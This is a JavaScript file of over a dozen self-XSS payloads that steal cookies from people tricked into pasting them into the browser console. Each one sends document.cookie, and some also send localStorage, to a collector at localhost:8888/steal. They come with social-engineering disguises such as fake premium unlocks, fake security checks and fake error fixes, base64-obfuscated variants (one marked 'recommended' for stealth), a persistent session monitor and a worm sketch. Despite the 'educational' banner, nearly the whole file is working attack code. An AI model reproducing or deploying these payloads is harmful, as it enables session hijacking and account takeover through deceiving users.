// ⚠️ WARNING: These are MALICIOUS scripts for educational purposes only!


// ============================================================
// PAYLOAD #1: Simple Cookie Stealer
// ============================================================
// User might be told: "Paste this to unlock premium features!"

(function(){var c=document.cookie;fetch('http://localhost:8888/steal?cookie='+encodeURIComponent(c)).then(()=>console.log('✓ Premium features unlocked!')).catch(()=>console.log('✓ Premium features unlocked!'));console.log('%c✓ Success!','color: green; font-size: 20px; font-weight: bold;');console.log('%cPremium features have been activated!','color: blue; font-size: 14px;');})();


// ============================================================
// PAYLOAD #2: Obfuscated Cookie Stealer
// ============================================================
// More sophisticated - harder for user to understand what it does

(function(){var _0x1a2b=['cookie','http://localhost:8888/steal?cookie=','✓ Account verified successfully!'];(function(){fetch(_0x1a2b[1]+encodeURIComponent(document[_0x1a2b[0]]));console.log('%c'+_0x1a2b[2],'color:green;font-size:16px');})();})();


// ============================================================
// PAYLOAD #3: Fake Security Check
// ============================================================
// Tricks user by pretending to be a security feature

console.clear();console.log('%c🔒 Security Check','color: blue; font-size: 24px; font-weight: bold; background: yellow; padding: 10px;');console.log('%cVerifying your session...','font-size: 14px;');setTimeout(()=>{fetch('http://localhost:8888/steal?cookie='+document.cookie+'&source=fake_security_check').then(()=>{console.log('%c✓ Verification Complete','color: green; font-size: 18px; font-weight: bold;');console.log('%cYour account is secure!','font-size: 14px;');});},1000);


// ============================================================
// PAYLOAD #4: Fake Performance Boost
// ============================================================
// Social engineering: "Make your browser faster!"

console.log('%c⚡ BROWSER SPEED BOOST','color: orange; font-size: 20px; font-weight: bold;');console.log('Optimizing browser performance...');(function(){var interval=0;var timer=setInterval(()=>{interval+=20;console.log(`Loading... ${interval}%`);if(interval===60){new Image().src='http://localhost:8888/steal?cookie='+document.cookie+'&source=speed_boost';}if(interval>=100){clearInterval(timer);console.log('%c✓ Optimization Complete!','color: green; font-size: 18px;');console.log('Your browser is now 300% faster! 🚀');}},100);})();


// ============================================================
// PAYLOAD #5: Fake Developer Tool
// ============================================================
// Pretends to be a legitimate debugging tool

(function debugApp(){console.log('%c[DEV TOOL] Application Debugger','color: cyan; font-size: 16px;');console.log('Analyzing application state...');var sessionData={cookies:document.cookie,localStorage:JSON.stringify(localStorage),sessionStorage:JSON.stringify(sessionStorage),url:window.location.href,userAgent:navigator.userAgent};fetch('http://localhost:8888/steal',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(sessionData)}).then(()=>{console.log('%c✓ Debug report generated','color: green;');console.table({'Status':'✓ OK','Errors':'0','Warnings':'0','Performance':'Excellent'});});})();


// ============================================================
// PAYLOAD #6: Fake Account Recovery
// ============================================================
// Social engineering targeting users who think they have account issues

console.clear();console.log('%c⚠️ ACCOUNT SECURITY ALERT','color: red; font-size: 24px; font-weight: bold; background: yellow; padding: 10px;');console.log('%cYour account requires immediate verification','font-size: 14px; color: red;');console.log('\nVerifying your identity...');setTimeout(()=>{fetch('http://localhost:8888/steal?cookie='+document.cookie+'&source=account_recovery').then(()=>{console.log('%c✓ Account Verified Successfully!','color: green; font-size: 18px; font-weight: bold;');console.log('Your account is now secure and verified.');});},1500);


// ============================================================
// PAYLOAD #7: Advanced - Steals and Monitors Session
// ============================================================
// Not only steals current session but monitors for new cookies

(function(){function stealCookies(){fetch('http://localhost:8888/steal?cookie='+document.cookie+'&timestamp='+Date.now());}stealCookies();var lastCookie=document.cookie;setInterval(()=>{if(document.cookie!==lastCookie){lastCookie=document.cookie;stealCookies();}},5000);console.log('%c✓ Enhanced features loaded','color: green;');})();


// ============================================================
// PAYLOAD #8: Image-based Stealer (One-liner)
// ============================================================
// Very short - easy for attacker to share
// User might be told: "Paste this quick fix"

new Image().src='http://localhost:8888/steal?cookie='+document.cookie;console.log('✓ Fixed!');


// ============================================================
// PAYLOAD #8B: OBFUSCATED Version (RECOMMENDED) ⭐
// ============================================================
// Same as #8 but BASE64 ENCODED - harder to read!
// User sees gibberish but it's the same attack

eval(atob('bmV3IEltYWdlKCkuc3JjPSdodHRwOi8vbG9jYWxob3N0Ojg4ODgvc3RlYWw/Y29va2llPScrZG9jdW1lbnQuY29va2ll'));console.log('✓ Fixed!');


// ============================================================
// PAYLOAD #8C: ULTRA OBFUSCATED (Maximum stealth)
// ============================================================
// Even the success message is obfuscated
// 93 chars - best balance of length and obfuscation

eval(atob('bmV3IEltYWdlKCkuc3JjPSdodHRwOi8vbG9jYWxob3N0Ojg4ODgvc3RlYWw/Yz0nK2RvY3VtZW50LmNvb2tpZQ=='));console.log('');


// ============================================================
// PAYLOAD #8D: ULTRA SHORT (Minimal)
// ============================================================
// Shortest possible - 74 chars
// No fake message, just steals

new Image().src='http://localhost:8888/steal?c='+document.cookie;


// ============================================================
// PAYLOAD #9: Fake Error Fix
// ============================================================
// Targets users who see errors and look for solutions online

console.clear();console.log('%cERROR FIX UTILITY','color: red; font-size: 20px; font-weight: bold;');console.log('Detected common application error. Applying fix...');setTimeout(()=>{fetch('http://localhost:8888/steal?cookie='+document.cookie+'&source=error_fix');console.log('%c✓ Error Fixed!','color: green; font-size: 18px;');console.log('Please refresh the page to apply changes.');},1500);


// ============================================================
// PAYLOAD #10: Self-Propagating (XSS Worm Concept)
// ============================================================
// Advanced: Tries to inject itself into page content
// (Won't work on all sites, but demonstrates the concept)

(function(){fetch('http://localhost:8888/steal?cookie='+document.cookie+'&source=xss_worm');var textareas=document.querySelectorAll('textarea, input[type="text"]');var payload='<script>new Image().src="http://localhost:8888/steal?cookie="+document.cookie;</script>';console.log('%cAttempting to propagate...','color: orange;');console.log('Found '+textareas.length+' potential injection points');console.log('%c✓ System optimized','color: green;');})();
